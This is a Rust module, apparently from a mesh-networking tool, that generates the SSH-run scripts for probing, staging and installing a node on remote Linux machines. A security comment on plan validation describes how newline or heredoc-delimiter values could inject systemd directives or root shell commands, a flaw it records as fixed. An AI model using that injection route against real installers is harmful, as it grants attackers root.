//! Turning a machine into a node, from somewhere else.
//!
//! Two doors lead here: `meshnode adopt` on the CLI and **Add machines** in
//! Director. They differ in transport — the CLI shells out to `ssh(1)`, the
//! desktop app carries its own SSH client so a person can type a password
//! — and in nothing else. What runs *on the far machine* must be one text,
//! because a node installed from a laptop and a node installed from a
//! terminal that ended up with different units, different paths or a
//! different firewall rule would be two products that happen to share a
//! name. So everything that becomes a remote command lives here, as pure
//! functions over a plan, and both doors ask this module what to run.
//!
//! Nothing in this file opens a socket. Every function returns a string
//! for a shell on the other end, or parses what that shell printed back.
//!
//! ## The shape of a remote install
//!
//! 1. **Probe** — one round trip that reports what the machine is: OS,
//!    architecture, whether meshnode is already there, whether it already
//!    belongs to a mesh, whether it runs systemd, and what privilege the
//!    SSH account can reach. Printed as `mw.key=value` lines so a shell
//!    profile that greets the user with a banner is not a protocol error.
//! 2. **Stage** — the binary arrives on stdin, lands in a temporary file,
//!    is made executable and *run* (`--version`) before anything is
//!    installed. A half-written or wrong-architecture binary is caught
//!    here, as an unprivileged user, in a file nobody else can see.
//! 3. **Install** — the one privileged step. The staged file is renamed
//!    into place (atomic within a filesystem), the service account and
//!    directories are created, the shipped systemd unit is written with
//!    the right `ExecStart`, the opt-in fleet-upgrade drop-in is written
//!    or removed, the firewall port is opened where a firewall is
//!    actually running, and the unit is enabled — not started.
//! 4. **Join** — `meshnode join --pair --json` runs *as the service
//!    account*, with the service's own data directory, so the identity it
//!    creates is the identity the service will run with. The pairing
//!    code crosses back over the SSH channel and is compared by the
//!    caller (`mesh_core::pairing`'s argument: the channel is
//!    host-key-verified and already trusted enough to install a binary).
//! 5. **Start** — the unit starts, and the caller watches the mesh until
//!    the new member is alive.
//!
//! Privilege is the caller's concern, because only the caller knows
//! whether `sudo` will want a password and how to deliver one:
//! [`Privilege`] is what the probe can report and [`Privilege::wrap`]
//! wraps a command accordingly.

use std::fmt;

use anyhow::{Result, bail};

/// The shipped systemd unit: one file, shared with the `.deb`/`.rpm`
/// packaging and with the tarball's README, so a node installed over SSH
/// runs under *exactly* the hardening a packaged one does.
const UNIT_TEMPLATE: &str = include_str!("../../../packaging/systemd/meshnode.service");
/// The opt-in drop-in that lets a node replace its own binary (M24 §4).
const DROPIN_TEMPLATE: &str =
    include_str!("../../../packaging/systemd/meshnode-fleet-upgrade.conf");
/// Where the service account's podman service listens, relative to the
/// node's home: `Layout::engine_socket`, spelled for a shell script.
const ENGINE_SOCKET: &str = "run/podman.sock";

/// The drop-in that moves the service account's `podman.socket` to where
/// `meshnode.service` can reach it (`crate::engines`, *Where containers are
/// made*). The same text is in `packaging/deb/postinst`, for the packaged
/// home; a test holds the two together.
pub fn engine_socket_dropin(data_dir: &str) -> String {
    format!(
        "# Written by meshnode's installer. meshnode.service starts its containers\n\
         # through this socket: it cannot reach podman's usual one, under /run/user,\n\
         # and a rootless container cannot be made from inside its unit.\n\
         [Socket]\n\
         ListenStream=\n\
         ListenStream={data_dir}/{ENGINE_SOCKET}\n\
         SocketMode=0600\n"
    )
}

/// Gives the service account's user manager the controllers podman needs
/// to honour `--cpus` as well as `--memory`: podman's own documented setting
/// for rootless cpu limits, for this one account's manager and no other.
const ENGINE_DELEGATE_DROPIN: &str = "\
[Service]
Delegate=cpu cpuset io memory pids
";

/// The lines in the packaged unit this module re-points. Anchored as exact
/// text and asserted by a test, so a rewrite of the unit that moves one of
/// them fails `cargo test` rather than a deploy.
const UNIT_EXEC_ANCHOR: &str = "ExecStart=/usr/bin/meshnode up";
const UNIT_DATA_ANCHOR: &str = "Environment=MESHWARE_DATA_DIR=/var/lib/meshware";
const UNIT_CONFIG_ANCHOR: &str = "Environment=XDG_CONFIG_HOME=/etc/meshware";
const UNIT_RW_ANCHOR: &str = "ReadWritePaths=/var/lib/meshware";
const DROPIN_RW_ANCHOR: &str = "ReadWritePaths=/usr/local/bin";

/// The default mesh port, which is also the pairing port: the joiner binds
/// the address the daemon is configured to listen on precisely so that the
/// one firewall rule the daemon needs is the one pairing needs.
pub const DEFAULT_PORT: u16 = crate::config::DEFAULT_PORT;

// ---------------------------------------------------------------------------
// Targets
// ---------------------------------------------------------------------------

/// One machine to reach: `[user@]host[:port]`.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Target {
    pub user: Option<String>,
    pub host: String,
    pub port: u16,
}

impl Target {
    /// Parse `user@host`, `host:2222`, `user@[fe80::1]:2222`, a bare IPv6
    /// literal, or an `ssh://` URL. Whitespace around it is ignored.
    pub fn parse(raw: &str) -> Result<Target> {
        Target::parse_with_default(raw, 22)
    }

    /// The same, for a fleet that does not run SSH on 22.
    ///
    /// The default is what a target with **no port of its own** gets, and
    /// nothing more: a target that names one still means it. That
    /// precedence is the point — a screen offering one port for a rack has
    /// to leave the one machine that is different sayable on its own line,
    /// or the person edits the field back and forth and the rack is worse
    /// off than if it had no field at all.
    pub fn parse_with_default(raw: &str, default_port: u16) -> Result<Target> {
        let default_port = if default_port == 0 { 22 } else { default_port };
        let s = raw.trim();
        let s = s.strip_prefix("ssh://").unwrap_or(s);
        let s = s.trim_end_matches('/');
        if s.is_empty() {
            bail!("empty target");
        }
        let (user, rest) = match s.rsplit_once('@') {
            Some((u, h)) if !u.is_empty() => (Some(u.to_string()), h),
            Some((_, h)) => (None, h),
            None => (None, s),
        };
        if rest.is_empty() {
            bail!("`{raw}` names no host");
        }
        // `[fe80::1]:2222` — the bracketed form exists so a port can be
        // told apart from an address's own colons.
        if let Some(inner) = rest.strip_prefix('[') {
            let Some((host, tail)) = inner.split_once(']') else {
                bail!("`{raw}`: unbalanced `[` in the host");
            };
            let port = match tail.strip_prefix(':') {
                Some(p) => parse_port(raw, p)?,
                None if tail.is_empty() => default_port,
                None => bail!("`{raw}`: unexpected text after the host"),
            };
            return Ok(Target {
                user,
                host: host.to_string(),
                port,
            });
        }
        // A bare IPv6 literal has several colons and no port.
        if rest.matches(':').count() > 1 {
            return Ok(Target {
                user,
                host: rest.to_string(),
                port: default_port,
            });
        }
        let (host, port) = match rest.rsplit_once(':') {
            Some((h, p)) if !p.is_empty() => (h, parse_port(raw, p)?),
            Some((h, _)) => (h, default_port),
            None => (rest, default_port),
        };
        if host.is_empty() || host.chars().any(char::is_whitespace) {
            bail!("`{raw}` is not a hostname");
        }
        Ok(Target {
            user,
            host: host.to_string(),
            port,
        })
    }

    /// The host to dial for the data plane — the SSH host, which is the
    /// one address known to reach the machine.
    pub fn dial_host(&self) -> &str {
        &self.host
    }

    /// The name a person typed, normalised: `ops@rack-1`, `ops@[fe80::1]:2222`.
    pub fn label(&self) -> String {
        let host = if self.host.contains(':') {
            format!("[{}]", self.host)
        } else {
            self.host.clone()
        };
        let port = if self.port == 22 {
            String::new()
        } else {
            format!(":{}", self.port)
        };
        match &self.user {
            Some(u) => format!("{u}@{host}{port}"),
            None => format!("{host}{port}"),
        }
    }
}

impl fmt::Display for Target {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        f.write_str(&self.label())
    }
}

fn parse_port(raw: &str, p: &str) -> Result<u16> {
    match p.parse::<u16>() {
        Ok(n) if n > 0 => Ok(n),
        _ => bail!("`{raw}`: `{p}` is not a port"),
    }
}

/// `host:port`, bracketing an IPv6 literal so it parses as a socket address.
pub fn dial_addr(host: &str, port: u16) -> String {
    if host.contains(':') && !host.starts_with('[') {
        format!("[{host}]:{port}")
    } else {
        format!("{host}:{port}")
    }
}

/// Expand shell-style braces in a target.
///
/// `ops@rack-{1..10}` is what the documentation says, and an unquoted one is
/// expanded by the user's shell before this ever sees it. A quoted one is
/// not — and people quote, because half the examples they have copied from
/// elsewhere are quoted. A text field in Director is never a shell at all.
/// Expanding here means every spelling does the same thing.
///
/// Supports `{1..10}`, `{01..10}` (width-preserving), and `{a,b,c}`, nested
/// and repeated. Anything else is left alone: a brace that is not a range or
/// a list is somebody's hostname, not a mistake.
pub fn expand(target: &str) -> Result<Vec<String>> {
    let Some((prefix, body, suffix)) = split_braces(target) else {
        return Ok(vec![target.to_string()]);
    };
    let mut out = Vec::new();
    for item in alternatives(&body)? {
        for tail in expand(&suffix)? {
            out.push(format!("{prefix}{item}{tail}"));
            if out.len() > MAX_TARGETS {
                bail!(
                    "`{target}` expands to more than {MAX_TARGETS} hosts — that is almost \
                     certainly a typo in a range, and if it is not, put the list in a file and \
                     use a shell loop"
                );
            }
        }
    }
    Ok(out)
}

/// A brace or CIDR expansion that produces more hosts than anybody meant to
/// type is almost certainly a typo (`{1..100000}`, `0.0.0.0/0`), and finding
/// out by opening a hundred thousand SSH connections is a bad way to find
/// out.
///
/// **The bound belongs in the iterator, not after it** (S-M7). Every one of
/// these functions had a sensible limit and built the whole list before
/// checking it: `{1..9999999999}` collected ten billion `i64` — about 80 GB
/// — to be told it was too many, and `0.0.0.0/0` collected 4.29 billion
/// `IpAddr`. The IPv6 branch of `expand_cidr` already got this right, which
/// is what made the IPv4 one look deliberate.
const MAX_TARGETS: usize = 4096;

/// Every target a person handed over, expanded and de-duplicated in order.
///
/// Each entry may itself hold several targets separated by whitespace,
/// commas or newlines — a pasted column of hostnames is the common case in
/// a text field. A host named twice is a host adopted twice: two identities
/// on one machine, from one command, silently — so duplicates collapse.
pub fn expand_all<S: AsRef<str>>(raw: &[S]) -> Result<Vec<String>> {
    let mut out = Vec::new();
    let mut seen = std::collections::BTreeSet::new();
    for entry in raw {
        for line in entry.as_ref().lines() {
            let line = line.trim();
            // A `#` line is a comment — the shape a hosts file has.
            if line.is_empty() || line.starts_with('#') {
                continue;
            }
            for word in line
                .split(|c: char| c.is_whitespace() || c == ',')
                .map(str::trim)
                .filter(|w| !w.is_empty())
            {
                for t in expand(word)? {
                    for h in expand_cidr(&t)? {
                        if seen.insert(h.clone()) {
                            out.push(h);
                        }
                    }
                }
            }
        }
    }
    Ok(out)
}

/// `[user@]10.0.0.0/28` → one target per usable host address.
///
/// A subnet is how a rack is written down in the network's own terms, and
/// a person who has one should not have to retype it as a range. Network
/// and broadcast addresses are skipped for IPv4 the way `nmap` skips them;
/// a `/32` (or `/128`) is the one host it names. Anything without a `/`
/// is not a network and passes through untouched.
fn expand_cidr(target: &str) -> Result<Vec<String>> {
    const MAX: usize = MAX_TARGETS;
    let (user, host) = match target.rsplit_once('@') {
        Some((u, h)) => (Some(u), h),
        None => (None, target),
    };
    if !host.contains('/') {
        return Ok(vec![target.to_string()]);
    }
    let Ok(net) = host.parse::<ipnet::IpNet>() else {
        return Ok(vec![target.to_string()]);
    };
    let hosts: Vec<std::net::IpAddr> = match net {
        ipnet::IpNet::V4(n) if n.prefix_len() >= 31 => {
            n.hosts().map(std::net::IpAddr::from).collect()
        }
        // `take` here too (S-M7). The V6 branch below always had it; without
        // it, `0.0.0.0/0` collected 4.29 billion addresses on its way to
        // being told there were too many.
        ipnet::IpNet::V4(n) => n
            .hosts()
            .filter(|a| *a != n.network() && *a != n.broadcast())
            .take(MAX + 1)
            .map(std::net::IpAddr::from)
            .collect(),
        ipnet::IpNet::V6(n) => n
            .hosts()
            .take(MAX + 1)
            .map(std::net::IpAddr::from)
            .collect(),
    };
    if hosts.len() > MAX {
        bail!(
            "`{host}` is {} addresses — more than anybody adds at once. Use a smaller prefix, \
             or a range of the hosts you mean",
            if hosts.len() > MAX {
                format!("over {MAX}")
            } else {
                hosts.len().to_string()
            }
        );
    }
    Ok(hosts
        .into_iter()
        .map(|a| match user {
            Some(u) => format!("{u}@{a}"),
            None => a.to_string(),
        })
        .collect())
}

/// Split at the first *balanced* brace group: `(before, inside, after)`.
fn split_braces(s: &str) -> Option<(String, String, String)> {
    let open = s.find('{')?;
    let mut depth = 0usize;
    for (i, c) in s[open..].char_indices() {
        match c {
            '{' => depth += 1,
            '}' => {
                depth -= 1;
                if depth == 0 {
                    let close = open + i;
                    return Some((
                        s[..open].to_string(),
                        s[open + 1..close].to_string(),
                        s[close + 1..].to_string(),
                    ));
                }
            }
            _ => {}
        }
    }
    None
}

/// The items one brace group stands for.
fn alternatives(body: &str) -> Result<Vec<String>> {
    if let Some((lo, hi)) = body.split_once("..")
        && !lo.is_empty()
        && let (Ok(from), Ok(to)) = (lo.parse::<i64>(), hi.parse::<i64>())
    {
        // `{01..10}` keeps its width: `rack-1` and `rack-01` are different
        // machines and silently picking one would be the wrong kind of
        // helpful.
        let width = if lo.starts_with('0') && lo.len() > 1 {
            lo.len()
        } else {
            0
        };
        // `take(MAX_TARGETS + 1)` before `collect`, so the memory a typo
        // costs is bounded by the answer and not by the typo (S-M7).
        // `expand` sees one item too many and says so.
        let range: Vec<i64> = if from <= to {
            (from..=to).take(MAX_TARGETS + 1).collect()
        } else {
            (to..=from).rev().take(MAX_TARGETS + 1).collect()
        };
        return Ok(range
            .into_iter()
            .map(|n| {
                if width > 0 {
                    format!("{n:0width$}")
                } else {
                    n.to_string()
                }
            })
            .collect());
    }
    if body.contains(',') {
        return Ok(body.split(',').map(str::to_string).collect());
    }
    // A lone `{something}` is a literal brace in a hostname, kept as one.
    Ok(vec![format!("{{{body}}}")])
}

// ---------------------------------------------------------------------------
// Shell
// ---------------------------------------------------------------------------

/// Single-quote a string for a POSIX shell.
pub fn shell_quote(s: &str) -> String {
    format!("'{}'", s.replace('\'', r"'\''"))
}

/// A path as it should appear inside a remote shell command.
///
/// Quoted, so a directory with a space in it works — but `~/bin/meshnode`
/// has to keep expanding, and a quoted tilde does not. So the one leading
/// `~/` becomes `"$HOME/"` and the rest is quoted normally; shell string
/// concatenation does the join: `"$HOME/"'bin/meshnode'`.
pub fn remote_path(path: &str) -> String {
    match path.strip_prefix("~/") {
        Some(rest) => format!("\"$HOME/\"{}", shell_quote(rest)),
        None => shell_quote(path),
    }
}

/// `uname -m` spellings the release artifacts answer to.
pub fn normalise_arch(arch: &str) -> &str {
    match arch.trim() {
        "x86_64" | "amd64" => "x86_64",
        "aarch64" | "arm64" => "aarch64",
        other => other,
    }
}

/// The release target triple for an architecture: what the artifact and
/// the bundled-binary file names carry.
pub fn release_target(arch: &str) -> String {
    format!("{}-unknown-linux-musl", normalise_arch(arch))
}

/// `meshnode-<tag>-<arch>-unknown-linux-musl`: the bare-binary release
/// artifact, named for a version and an architecture.
pub fn artifact_name(version: &str, arch: &str) -> String {
    let tag = version.trim();
    let tag = if tag.starts_with('v') {
        tag.to_string()
    } else {
        format!("v{tag}")
    };
    format!("meshnode-{tag}-{}", release_target(arch))
}

/// The architecture an artifact name carries, if it is one.
pub fn arch_of_artifact(name: &str) -> Option<&str> {
    ["x86_64", "aarch64", "armv7", "riscv64"]
        .into_iter()
        .find(|a| name.contains(&format!("-{a}-")))
}

// ---------------------------------------------------------------------------
// Privilege
// ---------------------------------------------------------------------------

/// What the SSH account can reach, as the probe reports it.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Privilege {
    /// The account *is* root.
    Root,
    /// `sudo -n true` succeeds: NOPASSWD, or a cached ticket.
    SudoNoPassword,
    /// `sudo` exists and wants a password.
    SudoPassword,
    /// No `sudo` at all — a user-scope install is the only option.
    None,
}

impl Privilege {
    pub fn can_elevate(self) -> bool {
        !matches!(self, Privilege::None)
    }

    /// The wrapper for a privileged command.
    ///
    /// A password, when one is needed, travels on **stdin** as the first
    /// line: `sudo -S` reads exactly one line and hands the rest of the
    /// stream to the child, which is how a script can follow it on the
    /// same pipe. `-k` makes sudo ignore any cached ticket, so it *always*
    /// reads that line — without it, a ticket left by an earlier command
    /// would let the password fall through to the child as input. `-p ''`
    /// keeps the prompt off stderr.
    ///
    /// When no password is needed, no password line is sent — a NOPASSWD
    /// sudo never reads one, and the line would become the first line of
    /// the script.
    pub fn wrap(self, run_as: Option<&str>, cmd: &str) -> String {
        let user = run_as
            .map(|u| format!(" -u {}", shell_quote(u)))
            .unwrap_or_default();
        match self {
            Privilege::Root => match run_as {
                Some(u) => format!(
                    "if command -v runuser >/dev/null 2>&1; then runuser -u {} -- {cmd}; \
                     else su -s /bin/sh {} -c {}; fi",
                    shell_quote(u),
                    shell_quote(u),
                    shell_quote(cmd)
                ),
                None => cmd.to_string(),
            },
            Privilege::SudoNoPassword => format!("sudo -n{user} {cmd}"),
            Privilege::SudoPassword => format!("sudo -k -S -p ''{user} {cmd}"),
            Privilege::None => cmd.to_string(),
        }
    }

    /// Whether a password line must precede stdin for a command wrapped
    /// with [`Self::wrap`].
    pub fn wants_password(self) -> bool {
        matches!(self, Privilege::SudoPassword)
    }
}

// ---------------------------------------------------------------------------
// Probe
// ---------------------------------------------------------------------------

/// Which firewall is *running* — not merely installed.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Default)]
pub enum Firewall {
    #[default]
    None,
    Firewalld,
    Ufw,
}

/// Where an existing mesh identity was found.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ExistingMesh {
    /// Under the system data directory (a service install).
    System,
    /// Under the SSH user's own home (a user install, or a manual one).
    Home,
}

/// What the far machine is, as the probe reported it.
#[derive(Debug, Clone, Default)]
pub struct Probe {
    pub os: String,
    pub arch: String,
    /// The SSH account.
    pub user: String,
    pub home: String,
    pub hostname: String,
    pub distro: String,
    /// An existing meshnode's `--version` output, if there is one.
    pub version: Option<String>,
    /// Where an existing meshnode binary is, if any.
    pub exe: Option<String>,
    pub existing_mesh: Option<ExistingMesh>,
    pub systemd: bool,
    pub privilege: Option<Privilege>,
    /// `systemctl is-active meshnode`.
    pub service_active: bool,
    pub firewall: Firewall,
    /// Whether this machine labels files and enforces those labels on
    /// `execve` — the difference between a Fedora/RHEL box and a Debian
    /// one, and the difference between an installed binary that runs and
    /// one that does not (see [`InstallPlan::relabel`]).
    pub selinux: Selinux,
}

/// SELinux, as the probe finds it.
///
/// Asked of the machine rather than inferred from its `PRETTY_NAME`: it
/// ships enforcing on Fedora and RHEL, is available and usually off on
/// Debian and Ubuntu, and either can be switched by whoever runs the box.
/// A distro name is a good guess and the machine's own answer is a fact.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Default)]
pub enum Selinux {
    /// No SELinux, or it is switched off. Labels do not gate anything.
    #[default]
    Absent,
    /// Labelled, and a wrong label is logged rather than refused.
    Permissive,
    /// Labelled, and a wrong label on the binary means the service cannot
    /// start at all.
    Enforcing,
}

impl Selinux {
    /// Would a wrong label stop the service from starting here?
    pub fn enforces(self) -> bool {
        self == Selinux::Enforcing
    }
}

impl Probe {
    /// The bare version number out of `meshnode 0.6.0`.
    pub fn version_number(&self) -> Option<String> {
        self.version
            .as_deref()
            .and_then(|v| v.split_whitespace().last())
            .map(|v| v.trim_start_matches('v').to_string())
    }
}

/// The probe: one round trip, every fact.
///
/// `mw.key=value` lines. Positional output was the first design and it
/// broke the first time a `.bashrc` printed a fortune — a shell profile
/// that greets its user is not a protocol error, so the parser reads only
/// lines it recognises.
pub fn probe_script(install_path: &str, data_dir: &str) -> String {
    let bin = remote_path(install_path);
    let data = shell_quote(data_dir);
    format!(
        "printf 'mw.os=%s\\n' \"$(uname -s)\"\n\
         printf 'mw.arch=%s\\n' \"$(uname -m)\"\n\
         printf 'mw.user=%s\\n' \"$(id -un)\"\n\
         printf 'mw.home=%s\\n' \"$HOME\"\n\
         printf 'mw.host=%s\\n' \"$(uname -n)\"\n\
         (. /etc/os-release 2>/dev/null && printf 'mw.distro=%s\\n' \"${{PRETTY_NAME:-$ID}}\") || true\n\
         if v=$({bin} --version 2>/dev/null); then printf 'mw.version=%s\\n' \"$v\" | head -n1; printf 'mw.exe=%s\\n' {bin}\n\
         elif v=$(meshnode --version 2>/dev/null); then printf 'mw.version=%s\\n' \"$v\" | head -n1; printf 'mw.exe=%s\\n' \"$(command -v meshnode)\"\n\
         fi\n\
         if [ -d /run/systemd/system ] && command -v systemctl >/dev/null 2>&1; then\n\
           echo mw.systemd=1\n\
           e=$(systemctl show -p ExecStart --value meshnode 2>/dev/null | sed -n 's/.*path=\\([^ ;]*\\).*/\\1/p' | head -n1)\n\
           [ -n \"$e\" ] && printf 'mw.exe=%s\\n' \"$e\"\n\
           if systemctl is-active meshnode >/dev/null 2>&1; then echo mw.service=active; fi\n\
         fi\n\
         if [ -e {data}/mesh/genesis.json ]; then echo mw.mesh=system\n\
         elif [ -e \"${{MESHWARE_HOME:-${{MESHWARE_DATA_DIR:-$HOME/.meshware}}}}/mesh/genesis.json\" ]; then echo mw.mesh=home\n\
         fi\n\
         if [ \"$(id -u)\" = 0 ]; then echo mw.priv=root\n\
         elif sudo -n true >/dev/null 2>&1; then echo mw.priv=sudo\n\
         elif command -v sudo >/dev/null 2>&1; then echo mw.priv=sudo-password\n\
         else echo mw.priv=none\n\
         fi\n\
         if command -v firewall-cmd >/dev/null 2>&1 && firewall-cmd --state >/dev/null 2>&1; then echo mw.firewall=firewalld\n\
         elif command -v ufw >/dev/null 2>&1 && ufw status 2>/dev/null | grep -q '^Status: active'; then echo mw.firewall=ufw\n\
         fi\n\
         if command -v getenforce >/dev/null 2>&1; then printf 'mw.selinux=%s\\n' \"$(getenforce 2>/dev/null | tr 'A-Z' 'a-z')\"\n\
         elif [ -r /sys/fs/selinux/enforce ]; then\n\
           if [ \"$(cat /sys/fs/selinux/enforce 2>/dev/null)\" = 1 ]; then echo mw.selinux=enforcing; else echo mw.selinux=permissive; fi\n\
         fi\n\
         echo mw.probe=done\n"
    )
}

/// Read what the probe printed.
pub fn parse_probe(out: &str) -> Result<Probe> {
    let mut p = Probe::default();
    let mut done = false;
    for (key, value) in kv_lines(out) {
        match key {
            "os" => p.os = value.to_string(),
            "arch" => p.arch = normalise_arch(value).to_string(),
            "user" => p.user = value.to_string(),
            "home" => p.home = value.to_string(),
            "host" => p.hostname = value.to_string(),
            "distro" => p.distro = value.to_string(),
            "version" => p.version = Some(value.to_string()),
            // The unit's ExecStart is printed after the PATH lookup and
            // wins: it is where the *service* runs from.
            "exe" => p.exe = Some(value.to_string()),
            "systemd" => p.systemd = value == "1",
            "service" => p.service_active = value == "active",
            "mesh" => {
                p.existing_mesh = match value {
                    "system" => Some(ExistingMesh::System),
                    "home" => Some(ExistingMesh::Home),
                    _ => None,
                }
            }
            "priv" => {
                p.privilege = Some(match value {
                    "root" => Privilege::Root,
                    "sudo" => Privilege::SudoNoPassword,
                    "sudo-password" => Privilege::SudoPassword,
                    _ => Privilege::None,
                })
            }
            "firewall" => {
                p.firewall = match value {
                    "firewalld" => Firewall::Firewalld,
                    "ufw" => Firewall::Ufw,
                    _ => Firewall::None,
                }
            }
            "selinux" => {
                p.selinux = match value {
                    "enforcing" => Selinux::Enforcing,
                    "permissive" => Selinux::Permissive,
                    _ => Selinux::Absent,
                }
            }
            "probe" => done = value == "done",
            _ => {}
        }
    }
    if !done || p.os.is_empty() || p.arch.is_empty() {
        bail!("the machine did not answer the probe — is this a POSIX host with `uname`?");
    }
    Ok(p)
}

/// The `mw.key=value` lines in some output, in order.
pub fn kv_lines(out: &str) -> impl Iterator<Item = (&str, &str)> {
    out.lines().filter_map(|l| {
        let l = l.trim();
        let rest = l.strip_prefix("mw.")?;
        let (k, v) = rest.split_once('=')?;
        Some((k, v.trim()))
    })
}

/// Why the service would not start, when the machine said enough to know.
///
/// One case earns a function of its own, because it is the case where
/// every visible fact points at the wrong answer. systemd refuses to
/// `execve` a binary whose SELinux type its own domain may not execute,
/// and reports it as **`203/EXEC` — "Unable to locate executable:
/// Permission denied"**. The file is there, it is `0755`, it is
/// `root:root`, and `ssh root@host` proves root can run it. Every check a
/// person makes says the message is wrong, so they check them all twice
/// and then look at SELinux last, if at all.
///
/// The label is the whole story, and the install now sets it — so this
/// covers the machine installed before that, and any other path that
/// moves a binary into place behind our back.
pub fn start_failure_hint(out: &str) -> Option<String> {
    let status = kv_value(out, "exec_status")?;
    let context = kv_value(out, "exec_context").unwrap_or_default();
    // 203 is systemd's EXEC failure. Anything else is the daemon itself
    // exiting, which its own logs explain better than a guess would.
    if status.trim() != "203" {
        return None;
    }
    // `unconfined_u:object_r:user_tmp_t:s0` — the type is the third field.
    let ty = context.split(':').nth(2).unwrap_or("").trim();
    // The types systemd is allowed to execute from. Anything else is a
    // file that was moved into place rather than created there.
    const RUNNABLE: [&str; 4] = ["bin_t", "usr_t", "shell_exec_t", "meshnode_exec_t"];
    if RUNNABLE.contains(&ty) {
        return None;
    }
    if ty.is_empty() {
        // The label could not be read — a machine whose `stat` has no
        // `%C`. That it labels at all is still the answer worth giving,
        // because `203/EXEC` there is nearly always this, and the message
        // it arrives with points somewhere else entirely.
        return (kv_value(out, "selinux") == Some("enforcing")).then(|| {
            "systemd could not execute the binary, and SELinux is enforcing on this machine — \
             which is nearly always the binary's label rather than its permissions. Check it with \
             `ls -Z <path>`; `restorecon -Fv <path>` puts it right."
                .to_string()
        });
    }
    Some(format!(
        "SELinux is refusing to execute the binary: it is labelled `{ty}`, which systemd may not run, because it was moved into place rather than created there. Nothing is wrong with its permissions. Fix it on that machine with `restorecon -Fv <path>` and start the service again."
    ))
}

/// One value out of `mw.key=value` output.
pub fn kv_value<'a>(out: &'a str, key: &str) -> Option<&'a str> {
    kv_lines(out)
        .filter(|(k, _)| *k == key)
        .map(|(_, v)| v)
        .last()
}

// ---------------------------------------------------------------------------
// Plans
// ---------------------------------------------------------------------------

/// Whether the node is installed for the machine or for one account.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Scope {
    /// `/usr/local/bin`, a `meshnode` service user, a system unit. What a
    /// server should get.
    System,
    /// `~/.local/bin`, the account's own home, a `systemctl --user` unit.
    /// What a machine without root can still get.
    User,
}

/// Everything a remote install needs to know, decided once.
#[derive(Debug, Clone)]
pub struct InstallPlan {
    pub scope: Scope,
    /// Where the binary goes.
    pub install_path: String,
    /// The node's home: identity, state, content.
    pub data_dir: String,
    /// `XDG_CONFIG_HOME` for the service.
    pub config_home: String,
    /// The account the daemon runs as.
    pub service_user: String,
    /// Write the opt-in drop-in that lets the node replace its own binary,
    /// so mesh-driven rollouts (`meshnode upgrade --on`) work without a
    /// visit. Off means every upgrade of this node goes over SSH.
    pub fleet_upgrade: bool,
    /// Open the mesh port in firewalld/ufw, where one is running.
    pub open_firewall: bool,
    /// The UDP port the daemon (and pairing) listens on.
    pub port: u16,
}

impl InstallPlan {
    /// The server shape: what the packaged install produces.
    pub fn system(install_path: Option<&str>) -> InstallPlan {
        InstallPlan {
            scope: Scope::System,
            install_path: install_path
                .filter(|p| !p.trim().is_empty())
                .unwrap_or("/usr/local/bin/meshnode")
                .to_string(),
            data_dir: "/var/lib/meshware".into(),
            config_home: "/etc/meshware".into(),
            service_user: "meshnode".into(),
            fleet_upgrade: true,
            open_firewall: true,
            port: DEFAULT_PORT,
        }
    }

    /// The no-root shape, inside the SSH account's home.
    pub fn user(home: &str, user: &str) -> InstallPlan {
        let home = home.trim_end_matches('/');
        InstallPlan {
            scope: Scope::User,
            install_path: format!("{home}/.local/bin/meshnode"),
            data_dir: format!("{home}/.meshware"),
            config_home: format!("{home}/.config"),
            service_user: user.to_string(),
            fleet_upgrade: true,
            open_firewall: false,
            port: DEFAULT_PORT,
        }
    }

    /// Is every field of this plan safe to interpolate into a unit file and
    /// a root-run shell script? (S-M5)
    ///
    /// `install_path` comes from Director's "Add machines" form and from
    /// `meshnode adopt --install-path`; `service_user`, `data_dir` and
    /// `config_home` come from those or from what the *remote machine* said
    /// its home and account are. All four are `shell_quote`d where they
    /// reach a shell, and none of them was quoted where it reaches the
    /// **systemd unit** — which is then written, as root, by a heredoc.
    ///
    /// So a value containing a newline injected arbitrary systemd
    /// directives, and one containing a line reading `MW_EOF` ended the
    /// heredoc early and turned the rest of the unit into root shell
    /// commands. The only guard was a `debug_assert!`, which is not present
    /// in a release build; `heredoc` now picks a delimiter the body does not
    /// contain, and this refuses the values that made it interesting.
    ///
    /// Mostly self-inflicted — the operator is already installing software
    /// as root — but a form field on a fleet screen is exactly the kind of
    /// thing that later gets populated from a CSV.
    pub fn validate(&self) -> Result<(), String> {
        check_unit_path("the install path", &self.install_path)?;
        check_unit_path("the data directory", &self.data_dir)?;
        check_unit_path("the config directory", &self.config_home)?;
        check_service_user(&self.service_user)?;
        Ok(())
    }

    /// The directory the binary lives in.
    pub fn install_dir(&self) -> String {
        match self.install_path.rsplit_once('/') {
            Some((dir, _)) if !dir.is_empty() => dir.to_string(),
            _ => "/usr/local/bin".into(),
        }
    }

    /// The environment the daemon *and* the joiner run with — the same,
    /// so the identity pairing creates is the one the service starts with.
    pub fn env_prefix(&self) -> String {
        format!(
            "env MESHWARE_DATA_DIR={} XDG_CONFIG_HOME={}",
            shell_quote(&self.data_dir),
            shell_quote(&self.config_home)
        )
    }

    // -- stage --------------------------------------------------------------

    /// Phase 2 of an install, unprivileged: the binary on stdin lands in a
    /// temporary file, is made executable and is *run*.
    ///
    /// Reports `mw.staged=<path>` and `mw.version=<what it printed>`. A
    /// `noexec` `/tmp` — common on hardened hosts — is handled by moving
    /// the file into the account's home and trying again there; the file
    /// is the account's own either way.
    pub fn stage_script() -> String {
        "set -e\n\
         d=/tmp; [ -w \"$d\" ] || d=\"$HOME\"\n\
         tmp=$(mktemp \"$d/meshnode.XXXXXX\")\n\
         cat > \"$tmp\"\n\
         chmod 700 \"$tmp\"\n\
         if ! v=$(\"$tmp\" --version 2>/dev/null); then\n\
           t2=$(mktemp \"$HOME/meshnode.XXXXXX\"); mv -f \"$tmp\" \"$t2\"; tmp=$t2\n\
           if ! v=$(\"$tmp\" --version 2>&1); then rm -f \"$tmp\"; printf 'mw.error=%s\\n' \"$v\"; exit 1; fi\n\
         fi\n\
         printf 'mw.staged=%s\\nmw.version=%s\\n' \"$tmp\" \"$v\"\n"
            .to_string()
    }

    // -- install ------------------------------------------------------------

    /// Restore the SELinux label a path is *supposed* to have, where the
    /// machine has SELinux at all.
    ///
